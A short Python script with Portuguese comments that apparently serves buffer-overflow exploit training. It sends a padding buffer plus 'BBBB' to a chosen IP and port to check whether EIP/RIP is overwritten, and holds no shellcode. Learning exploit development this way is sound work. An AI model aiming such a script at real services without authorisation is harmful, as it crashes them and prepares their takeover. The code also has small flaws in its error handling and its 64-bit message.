import socket
import time

def send_data():
    print("=== Fuzzing para Buffer Overflow ===")
    
    # Solicitar o IP e a porta do usuário
    ip = input("Digite o IP do alvo: ")
    port = int(input("Digite a porta do alvo: "))
    
    try:
        # Solicitar o valor do offset encontrado
        offset = int(input("\nInsira o valor do offset encontrado: "))
        
        # Solicitar a arquitetura (32 ou 64 bits)
        arch = input("\nA aplicação é 32 ou 64 bits? (32/64): ").strip()
        
        # Criar o buffer com base na arquitetura
        if arch == "32":
            buffer = 'A' * offset + 'BBBB'
            print("\n[+] Arquitetura 32 bits detectada. Enviando buffer com 'BBBB'.")
        elif arch == "64":
            buffer = 'A' * offset + 'B' * 8
            print("\n[+] Arquitetura 64 bits detectada. Enviando buffer com 8 bytes de 'B'.")
        else:
            print("[!] Arquitetura inválida. Use '32' ou '64'.")
            return
        
        # Conectar ao IP e Porta fornecidos
        print("\nConectando a {}:{}".format(ip, port))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        
        # Tenta receber o banner da aplicação (se disponível)
        try:
            banner = sock.recv(1024).decode()
            print(f"[+] Banner recebido: {banner}")
        except:
            print("[!] Nenhum banner recebido.")
        
        # Enviar o buffer para a aplicação
        print(f"\nEnviando buffer de {len(buffer)} bytes...")
        sock.sendall(buffer.encode())
        print("[+] Buffer enviado com sucesso!")
        
        # Instruções para o usuário verificar no debugger
        print("\n[!] Verifique no debugger se o EIP/RIP foi alterado para '42424242'.")
        
    except socket.error as e:
        print(f"[!] Erro de conexão: {e}")
    except ValueError:
        print("[!] Entrada inválida. Certifique-se de inserir números inteiros corretamente.")
    except KeyboardInterrupt:
        print("\n[!] Envio interrompido pelo usuário.")
    finally:
        sock.close()
        print("\n[+] Conexão encerrada.")

if __name__ == "__main__":
    send_data()
